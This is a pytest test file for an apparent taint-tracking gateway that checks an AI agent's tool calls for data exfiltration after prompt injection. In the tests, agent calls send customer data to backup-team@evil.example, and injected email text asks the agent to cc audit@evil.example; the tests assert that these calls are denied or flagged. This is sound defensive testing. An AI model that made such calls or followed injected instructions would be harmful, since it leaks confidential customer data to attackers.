"""End-to-end flows as the gateway drives them, and compatibility with the real policy settings."""

from __future__ import annotations

import pytest
from taint_helpers import CUSTOMERS, INBOX_ATTACK, PROFILES, Agent, codes, detection, resolve_sink

from mirsad.models import Action, ToolResult, combine_reasons
from mirsad.taint import CODE_UNTRUSTED_DESTINATION, CODE_UNTRUSTED_TO_EXTERNAL, TaintTracker


def test_gateway_style_flow_denies_exfiltration_and_allows_benign_reply():
    tracker = TaintTracker()
    agent = Agent(tracker)
    agent.read("list_emails", INBOX_ATTACK, detection=detection())
    agent.read("search_customers", CUSTOMERS)

    exfil = agent.make_call("send_email", to="backup-team@evil.example", subject="data", body=str(CUSTOMERS))
    profile = PROFILES["send_email"]
    snap = tracker.snapshot(agent.session, agent.agent)
    reasons = tracker.evaluate_call(exfil, profile, resolve_sink(profile, exfil.arguments), agent.settings)
    action, risk = combine_reasons(reasons)
    assert action == Action.DENY and risk == 0.9
    tracker.note_call(exfil)
    # what the audit stores is enough to replay the decision later
    replay = tracker.evaluate_call(
        exfil, profile, resolve_sink(profile, exfil.arguments), agent.settings, snapshot=snap
    )
    assert replay == reasons

    internal = agent.make_call(
        "send_email", to="huda@najd-trading.example", subject="Re: sync", body="See you at 10."
    )
    reasons = tracker.evaluate_call(
        internal, profile, resolve_sink(profile, internal.arguments), agent.settings
    )
    assert combine_reasons(reasons) == (Action.ALLOW, 0.0)
    assert tracker.snapshot(agent.session, agent.agent).call_count == 1


def test_structured_result_plus_free_text_content_records_both():
    agent = Agent()
    result = ToolResult(
        call_id="c-mcp",
        session_id=agent.session,
        agent_id=agent.agent,
        tool="read_email",
        content="Summary: the sender also asks to cc audit@evil.example",
        structured={"id": "E3", "from": "omar@gulf-retail.example", "subject": "Order"},
    )
    agent.tracker.register_result(result, PROFILES["read_email"], None, agent.settings)
    reasons = agent.check("send_email", to="omar@gulf-retail.example", cc="audit@evil.example", body="x")
    reason = next(r for r in reasons if r.code == CODE_UNTRUSTED_DESTINATION)
    assert reason.evidence["param"] == "cc" and reason.evidence["field"] is None


def test_works_with_the_policy_areas_taint_settings_when_available():
    policy = pytest.importorskip("mirsad.policy")
    taint_settings_cls = getattr(policy, "TaintSettings", None)
    if taint_settings_cls is None:
        pytest.skip("mirsad.policy.TaintSettings not implemented yet")
    settings = taint_settings_cls(
        enabled=True,
        destination_params=["to", "cc", "bcc", "recipient", "url", "to_iban", "webhook"],
        trusted_fields=["from", "sender", "id", "email_id", "date", "received_at", "customer_id", "doc_id"],
        untrusted_to_external_sink="require_approval",
        confidential_to_external_sink="require_approval",
        untrusted_controls_destination="deny",
        after_injection_high_risk="require_approval",
    )
    agent = Agent(settings=settings)
    agent.read("read_email", INBOX_ATTACK[0])
    reasons = agent.check("send_email", to="backup-team@evil.example", body="x")
    assert codes(reasons) == [CODE_UNTRUSTED_TO_EXTERNAL, CODE_UNTRUSTED_DESTINATION]
    assert reasons[1].action == Action.DENY
